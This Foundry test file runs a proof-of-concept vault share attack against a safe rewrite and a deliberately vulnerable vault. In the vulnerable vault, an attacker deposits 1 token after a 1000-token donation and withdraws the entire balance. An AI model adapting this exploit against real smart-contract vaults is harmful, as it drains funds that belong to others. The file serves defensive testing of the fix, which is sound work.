// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import { Test } from "forge-std/Test.sol";
/// @notice safe version.
import { MinimalVault_Rewrite } from "../src/rewrite/MinimalVault_Rewrite.sol";
/// @notice vulnerable version.
import { MinimalVault_Vuln_PoC2 } from "../src/vulnerables/MinimalVault_Vuln_PoC2.sol";
import { ERC20Mock } from "../src/mocks/ERC20Mock.sol";
import { IERC20 } from "../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract PoC_Vault is Test {
    ERC20Mock token;
    MinimalVault_Rewrite safeVault;
    MinimalVault_Vuln_PoC2 vulnVault;
    address donor;
    address attacker;

    function setUp() public {
        token = new ERC20Mock();
        safeVault = new MinimalVault_Rewrite(IERC20(address(token)));
        vulnVault = new MinimalVault_Vuln_PoC2(IERC20(address(token)));
        donor = makeAddr("DONOR");
        attacker = makeAddr("ATTACKER");
        token.mint(donor, 2000);
        token.mint(attacker, 2);
        vm.startPrank(attacker);
        token.approve(address(safeVault), type(uint256).max);
        token.approve(address(vulnVault), type(uint256).max);
        vm.stopPrank();
    }

    function test_PoC2_VaultShareInflation() public {
        vm.startPrank(donor);
        token.transfer(address(safeVault), 1000);
        token.transfer(address(vulnVault), 1000);
        vm.stopPrank();
        vm.startPrank(attacker);
        safeVault.deposit(attacker, 1);
        vulnVault.deposit(attacker, 1);
        assertEq(token.balanceOf(address(safeVault)), 1001);
        assertEq(token.balanceOf(address(vulnVault)), 1001);
        assertEq(safeVault.totalShares(), 1);
        assertEq(vulnVault.totalShares(), 1);
        safeVault.withdraw(attacker, 1);
        vulnVault.withdraw(attacker, 1);
        assertEq(token.balanceOf(address(safeVault)), 1000);
        assertEq(token.balanceOf(address(vulnVault)), 0);
        assertEq(token.balanceOf(attacker), 1002);
    }
}